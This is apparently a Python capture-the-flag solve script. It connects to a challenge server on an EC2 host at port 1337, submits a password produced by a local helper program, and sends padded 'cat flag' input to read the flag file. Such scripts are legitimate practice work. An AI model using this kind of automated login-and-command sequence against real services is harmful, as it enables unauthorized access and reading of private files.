import socket
import time
import subprocess


# c = p, x = k, n = a, d = q, s = f
host, port = "ec2-18-222-89-163.us-east-2.compute.amazonaws.com", 1337



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))


pwd_auth = "3\n"
s.recv(1024)
s.send(pwd_auth.encode())
s.recv(1024)
pwd = subprocess.check_output("./helper")
pwd = pwd.decode()
pwd = pwd + "\n"
print(pwd)
s.send(pwd.encode())
pwd_fail_check = s.recv(1024).decode()
print(pwd_fail_check)

passed_pwd = "4\n"
print(s.recv(1024).decode())

s.send(passed_pwd.encode())
print(s.recv(1024).decode())
find_flag = ("cat flag" + " " * 25 + "cat flag" + " " * 25+"\n")
s.send(find_flag.encode())
print(s.recv(1024).decode())
print(s.recv(1024).decode())

